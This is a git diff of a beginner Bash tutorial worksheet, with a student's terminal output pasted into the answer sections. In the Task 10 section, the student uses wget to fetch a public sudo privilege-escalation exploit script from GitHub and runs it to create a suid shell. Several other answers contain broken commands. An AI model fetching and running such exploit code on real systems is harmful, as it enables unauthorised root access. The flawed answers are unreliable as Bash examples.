@@ -46,6 +46,7 @@ You are always free to type a new command, as soon as the computer _prompts_ you
 
 After logging in sucessfully, and getting the prompt, type `clear` and hit `enter` to clear your terminal emulators output.
 
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ 
 ---
 
 ### Task 2: Evaluating Arithmetical Expressions
@@ -69,9 +70,14 @@ echo $return_value
 Take notice of the prepending `$` here. 
 Try accessing the `return_value` identifier without prepending `$`.
 **What happens and why?**
+_______________________________________________________________________________________________________
 
-<details>
-    <summary>You Answer</summary>
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ echo $((4+5))
+9
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ return_value=$(( 4+5 ))
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ echo $return_value
+9
+_______________________________________________________________________________________________________
     ......
 </details>
 
@@ -95,11 +101,19 @@ and pressing `enter`.
 
 ![Invoking the Plus Function](./assets/plus_func.png)
 
-<details>
-    <summary>Calling a Function</summary>
-    Include a screenshot of your function-call!
-</details>
-
+_____________________________________________________________________________________________________________________
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ plus_func () {}
+-bash: syntax error near unexpected token `{}'
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ plus_func () { echo " This is the funktion" }
+>
+> Hello from plus-function
+> }
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ plus_func () {
+> echo "This is the plus funktion"
+> }
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ plus_func
+This is the plus funktion
+_____________________________________________________________________________________________________________________
 ### Task 4: Handling Parameters
 A function, that always does the same is also called a _constant_ function.
 Let's use parameters:
@@ -116,13 +130,21 @@ plus_func 5 8
 ```
 We now call `var1` and `var2` _variable identifiers_, because they can vary from function call to function call!
 
----
+_____________________________________________________________________________________________________________________
+
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ plus_func () {
+var1=$1
+var2=$2
+echo $(( $var1 + $var2 ))
+}
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ plus_func 5 8
+13
+_____________________________________________________________________________________________________________________
 
 ### Task 5: BASH Primitives
 Within these functions, the shell can evaluate a couple of different functionallities, such as:
 
 Here are several examples of expressions you can use in Bash, presented in a Markdown code block:
-
 
 #### 1. Arithmetic Operations
 
@@ -261,12 +283,18 @@ These examples demonstrate various fundamental operations in Bash scripting, inc
 **Write a function, combining at least 3 different of these primitives to a function**
 <details>
     <summary>Your Function</summary>
+    ____________________________________________________________________________________________________________________
     
-```bash
-your code
-```
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ a=10
+b=20
+if (( a < b )); then
+    result=$((a + b))
+else
+    result=$((a / b))
+fi; echo" $result"
+echo 30: 
+    ____________________________________________________________________________________________________________________
 
-</details>
 
 ### Task 6: Storing Data
 Close your Terminal-Emulator and open it up again. 
@@ -298,12 +326,26 @@ cat ./function
 * Redirect the first function into another file called `./functions`
 * Redirect the second function into that file as well, but using the append `>>` operator
 
-**What happend?**
-<details>
-    <summary>Your Explaination</summary>
-    .....
+___________________________________________________________________________________________________________________________________________________________________________________
 
-</details>
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ declare -f my_secondfunc
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ my_secondfunc () {
+> echo "Call and Save"
+> }
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ declare -f my_secondfunc > ./funktion
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ cat ./funktion
+my_secondfunc ()
+{
+    echo "Call and Save"
+}
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$  cat ./function
+my_firstfunc ()
+{
+    echo "Save and Print"
+}
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$
+
+___________________________________________________________________________________________________________________________________________________________________________________
 
 --- 
 
@@ -342,10 +384,9 @@ The idea of it being a _folder_ arose with **Windows** which visualized director
 You can use a shorthand within your calls to add this string as a prefix to any file that you reference in that call by writing `./`.
 
 **Look at task 6 again. What is the complete filepath of your functions file?**
-<details>
+
     <summary>Your Answer</summary>
-    ....
-</details>
+/mnt/c/Users/Nick/function
 
 All filenames start with a `/`. 
 If you see this in front of a filename, you'll know, that it is the _absolute_ path on your filesystem. 
@@ -358,6 +399,11 @@ realpath ./functions
 ### Task 8: Listing Files
 In order to list all files with your `pwd`, type the `ls` command. 
 If you want more information about those files type `ls -la`
+___________________________________________________________________________________________________________________________________________________________________________________
+
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ pwd ls ls -la
+/mnt/c/Users/Nick
+___________________________________________________________________________________________________________________________________________________________________________________
 
 ### Task 9: Switching your `pwd`
 Use the `cd` command to switch your directory. 
@@ -366,9 +412,12 @@ Let's navigate into the basis of your filesystem, the `root` directory:
 cd /
 ```
 **Run `ls` again and insert the content here:**
-<details>
-    <summary>Your Answer</summary>
-    ....
+___________________________________________________________________________________________________________________________________________________________________________________
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ cd /
+ick@DESKTOP-F0EDLD6:/$ ls
+bin  bin.usr-is-merged  boot  dev  etc  home  init  lib  lib.usr-is-merged  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  sbin.usr-is-merged  snap  srv  sys  tmp  usr  var
+ick@DESKTOP-F0EDLD6:/$
+___________________________________________________________________________________________________________________________________________________________________________________
 </details>
 
 Now navigate through your filesystem using `cd` and the name of the directory you want to set as your new `pwd`.
@@ -385,9 +434,13 @@ Use `rm` to delete a file and `rm -rf` to delete a directory.
     <summary>Your Terminal Output</summary>
 ```bash
 your terminal output
-```
-</details>
-
+___________________________________________________________________________________________________________________________________________________________________________________   
+ick@DESKTOP-F0EDLD6:/$ mkdir touch rm rm -rf
+mkdir: invalid option -- 'r'
+Try 'mkdir --help' for more information.
+ick@DESKTOP-F0EDLD6:/$ ~/mnt/c/Users/Nick/functions
+-bash: /home/ick/mnt/c/Users/Nick/functions: No such file or directory
+___________________________________________________________________________________________________________________________________________________________________________________
 ### Task 10: Managing Software
 We learned a few shell-primitives up until here. 
 Of course, we could write all software ourselves, using these easy primitives, but some software already has been written. 
@@ -421,6 +474,55 @@ sudo apt install vim
 ```
 This will call the program `apt` and more specifically its function `install`, search for the package `vim`, download it and install it. 
 Run the routine and install `vim`.
+
+___________________________________________________________________________________________________________________________________________________________________________________
+
+ick@DESKTOP-F0EDLD6:/mnt/c/Users/Nick$ cd /tmp
+ick@DESKTOP-F0EDLD6:/tmp$ wget https://raw.githubusercontent.com/nongiach/sudo_inject/refs/heads/master/exploit_v2.sh
+--2025-04-15 23:13:51--  https://raw.githubusercontent.com/nongiach/sudo_inject/refs/heads/master/exploit_v2.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 493 [text/plain]
+Saving to: ‘exploit_v2.sh’
+
+exploit_v2.sh                                        100%[===================================================================================================================>]     493  --.-KB/s    in 0s
+
+2025-04-15 23:13:51 (5.16 MB/s) - ‘exploit_v2.sh’ saved [493/493]
+
+ick@DESKTOP-F0EDLD6:/tmp$ chmod +x exploit_v2.sh
+ick@DESKTOP-F0EDLD6:/tmp$ ./exploit_v2.sh
+Creating suid shell in /tmp/sh
+Current process : 741
+Injecting process 377 -> bash
+Injecting process 540 -> bash
+Injecting process 688 -> bash
+ick@DESKTOP-F0EDLD6:/tmp$ sudo -i
+[sudo] password for ick:
+
+
+
+kpöikjoSorry, try again.
+[sudo] password for ick:
+
+Sorry, try again.
+[sudo] password for ick:
+j
+sudo: 3 incorrect password attempts
+ick@DESKTOP-F0EDLD6:/tmp$ j
+j: command not found
+ick@DESKTOP-F0EDLD6:/tmp$ ./exploit_v2.sh
+Creating suid shell in /tmp/sh
+Current process : 769
+Injecting process 377 -> bash
+Injecting process 540 -> bash
+Injecting process 688 -> bash
+ick@DESKTOP-F0EDLD6:/tmp$ sodo-i
+sodo-i: command not found
+ick@DESKTOP-F0EDLD6:/tmp$ sudo -i
+[sudo] password for ick:
+
+___________________________________________________________________________________________________________________________________________________________________________________
 
 ### Task 11: Manipulating Files
 `vim` is a commonly used text-editor. 
